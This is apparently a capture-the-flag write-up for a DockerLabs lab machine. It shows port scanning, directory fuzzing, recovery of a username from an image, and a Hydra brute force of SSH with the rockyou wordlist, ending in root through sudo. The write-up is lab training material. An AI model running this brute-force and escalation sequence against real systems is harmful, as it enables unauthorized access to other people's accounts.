# Recognize
#### ICMP
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/super-easy]
└─$ ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.054 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1022ms
rtt min/avg/max/mdev = 0.036/0.045/0.054/0.009 ms
```
# Enumeration
## Ports scanning
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/super-easy]
└─$ nmap -sV -sC 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-09 22:23 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
|_  256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 32:E6:96:8D:AA:63 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
```

Two open ports:
- 22 -> SSH
- 80 -> HTTP
## Web Dir Fuzzing
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/super-easy]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,conf,sh,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,conf,sh,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.txt             (Status: 403) [Size: 275]
.hta                 (Status: 403) [Size: 275]
.hta.php             (Status: 403) [Size: 275]
.hta.html            (Status: 403) [Size: 275]
.htaccess.txt        (Status: 403) [Size: 275]
.htpasswd.sh         (Status: 403) [Size: 275]
.htpasswd.conf       (Status: 403) [Size: 275]
.htpasswd            (Status: 403) [Size: 275]
.hta.conf            (Status: 403) [Size: 275]
.hta.sh              (Status: 403) [Size: 275]
.htaccess            (Status: 403) [Size: 275]
.htaccess.php        (Status: 403) [Size: 275]
.htaccess.html       (Status: 403) [Size: 275]
.htpasswd.txt        (Status: 403) [Size: 275]
.htaccess.conf       (Status: 403) [Size: 275]
.htaccess.sh         (Status: 403) [Size: 275]
.htpasswd.php        (Status: 403) [Size: 275]
.htpasswd.html       (Status: 403) [Size: 275]
index.html           (Status: 200) [Size: 50]
index.html           (Status: 200) [Size: 50]
server-status        (Status: 403) [Size: 275]
Progress: 27678 / 27678 (100.00%)
===============================================================
Finished
===============================================================
```

#### Explore index.html content
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/super-easy/vacaciones]
└─$ curl http://172.17.0.2
<html><body><img src='imagen.jpeg'></body></html>
```

#### Download jpeg
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/super-easy/vacaciones]
└─$ wget http://172.17.0.2/imagen.jpeg
--2026-09-09 22:35:59--  http://172.17.0.2/imagen.jpeg
Connecting to 172.17.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18667 (18K) [image/jpeg]
Saving to: ‘imagen.jpeg’

imagen.jpeg                     100%[======================================================>]  18.23K  --.-KB/s    in 0s

2026-09-09 22:35:59 (1.87 GB/s) - ‘imagen.jpeg’ saved [18667/18667]
```

Found username borazuwarah in imagen.jpeg source code

# Brute Force
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/super-easy/vacaciones]
└─$ hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-09 22:38:11
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-09 22:38:14
```

Cracked login for SSH
# Post Enumeration
```sh
borazuwarah@f2a3a31a42ae:~$ whoami
borazuwarah
borazuwarah@f2a3a31a42ae:~$ id
uid=1000(borazuwarah) gid=1000(borazuwarah) groups=1000(borazuwarah),27(sudo)
```

borazuwarah is in sudo group

```sh
borazuwarah@f2a3a31a42ae:~$ sudo -l
Matching Defaults entries for borazuwarah on f2a3a31a42ae:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User borazuwarah may run the following commands on f2a3a31a42ae:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```

borazuwarah user can execute any command

```sh
borazuwarah@f2a3a31a42ae:~$ sudo su
[sudo] password for borazuwarah:
root@f2a3a31a42ae:/home/borazuwarah# whoami
root
```
